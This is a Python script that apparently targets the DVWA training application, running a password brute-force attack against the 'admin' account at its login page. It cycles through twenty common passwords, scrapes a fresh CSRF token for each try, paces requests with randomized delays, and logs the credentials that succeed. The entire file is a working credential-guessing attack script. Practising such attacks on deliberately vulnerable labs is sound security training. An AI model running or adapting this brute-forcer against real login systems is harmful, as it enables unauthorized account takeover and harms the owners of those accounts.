import logging

from dvwa.utils import get_csrf_token
from dvwa.globals import DVWA_URL, DVWA_LOG_LEVEL
from dvwa.dynamic_session import DynamicSession


def main():
    url = f"{DVWA_URL}/login.php"
    username = "admin"
    passwords = [
        "123456",
        "123456789",
        "12345678",
        "12345",
        "1234567",
        "admin",
        "qwerty",
        "letmein",
        "welcome",
        "1234",
        "passw0rd",
        "monkey",
        "iloveyou",
        "dragon",
        "sunshine",
        "password",
        "master",
        "trustno1",
        "123qwe",
        "abc123",
    ]

    session = DynamicSession(delay_avg=0.2, delay_std=0.3)

    for password in passwords:
        csrf_token = get_csrf_token(session, url)

        data = {
            "username": username,
            "password": password,
            "Login": "Login",
            "user_token": csrf_token,
        }

        response = session.post(url, data=data, allow_redirects=False)

        if response.status_code == 302:
            redirect_url = response.headers.get("Location")
            if redirect_url:
                if not redirect_url.startswith("http"):
                    redirect_url = f"{DVWA_URL}/{redirect_url}"

                final_response = session.get(redirect_url)

                if "Logout" in final_response.text:
                    logging.info(f"[SUCCESS] {username}:{password}")
                    break
                else:
                    logging.info(f"[FAILED] {username}:{password}")
            else:
                logging.info("Redirect URL not found in response headers.")
        else:
            logging.info("No redirection found. Failed login.")
    else:
        logging.info("Brute-force attack failed. No matching password found.")


if __name__ == "__main__":
    logging.basicConfig(level=DVWA_LOG_LEVEL)
    main()
